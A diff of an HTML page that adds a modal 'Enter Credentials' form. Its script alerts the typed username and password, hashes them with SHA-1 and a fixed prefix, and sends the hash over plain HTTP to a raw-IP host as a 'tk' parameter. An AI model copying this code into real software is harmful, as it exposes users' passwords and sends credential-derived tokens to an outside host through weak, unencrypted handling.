@@ -1,7 +1,137 @@
 <!DOCTYPE html>
 <html>
 <meta name="viewport" content="width=device-width, initial-scale=1" />
+<style>
+body {font-family: Arial, Helvetica, sans-serif;}
+
+/* The Modal (background) */
+.modal {
+  display: none; /* Hidden by default */
+  position: fixed; /* Stay in place */
+  z-index: 1; /* Sit on top */
+  padding-top: 100px; /* Location of the box */
+  left: 0;
+  top: 0;
+  width: 100%; /* Full width */
+  height: 100%; /* Full height */
+  overflow: auto; /* Enable scroll if needed */
+  background-color: rgb(0,0,0); /* Fallback color */
+  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+/* Modal Content */
+.modal-content {
+  background-color: #fefefe;
+  margin: auto;
+  padding: 20px;
+  border: 1px solid #888;
+  width: 15%;
+}
+
+/* The Close Button */
+.close {
+  color: #aaaaaa;
+  float: right;
+  font-size: 28px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: #000;
+  text-decoration: none;
+  cursor: pointer;
+}
+</style>
+</head>
 <body>
-<a href="http://98.96.160.135/?tk=8e4Ntu">link to 98.96.160.135</a>
+<a href="http://000.000.111.223/">link to 000.000.111.223</a><BR><BR>
+<!-- Trigger/Open The Modal -->
+<button id="myBtn">Enter Credentials</button>
+<!-- The Modal -->
+<div id="myModal" class="modal">
+
+  <!-- Modal content -->
+  <div class="modal-content">
+    <span class="close">&times;</span>
+    <p>
+      <form>
+          <div class="container">
+            <label for="uname"><b>Username</b></label>
+            <input id="uname" type="text" placeholder="Enter Username" name="uname" required>
+            <BR><BR>
+            <label for="psw"><b>Password</b></label>
+            <input id="psw" type="password" placeholder="Enter Password" name="psw" required>
+            <BR>
+              <BR>
+              <button id="LoginBtn">Enter Credentials</button>
+          </div>
+      <div class="container" style="background-color:#f1f1f1">
+      </div>
+    </form>
+    </p>
+  </div>
+
+</div>
+<script>
+// Get the modal
+var modal = document.getElementById("myModal");
+
+//Send credentials
+var snd = document.getElementById("LoginBtn");
+
+// Get the button that opens the modal
+var btn = document.getElementById("myBtn");
+
+// User name
+var usr = document.getElementById("uname");
+
+// Password
+var pwd = document.getElementById("psw")
+
+// Get the <span> element that closes the modal
+var span = document.getElementsByClassName("close")[0];
+
+// returns a promise object
+async function sha1FromString(str) {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(str);
+  const hashBuffer = await crypto.subtle.digest('SHA-1', data);
+  const hashArray = Array.from(new Uint8Array(hashBuffer));
+  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  return hashHex;
+}
+
+// When the user clicks the button, open the modal
+btn.onclick = function() {
+  modal.style.display = "block";
+}
+
+// Send the credentials as a sha1
+snd.onclick = function()    {
+    let b = '5FdefD' + usr.value + pwd.value;
+    alert( b);
+    let mypromise = sha1FromString(b);
+    mypromise.then(
+            function(value) {
+              alert('sha1 is '+ value +' ok');
+              fetch('http://000.000.111.223/' + '?tk=' + value)
+              },
+            function(value) {alert(value+' nok');}
+    );
+    modal.style.display = "block";
+}
+
+// When the user clicks on <span> (x), close the modal
+span.onclick = function() {
+  modal.style.display = "none";
+}
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+  if (event.target == modal) {
+    modal.style.display = "none";
+  }
+}
+</script>
 </body>
 </html>
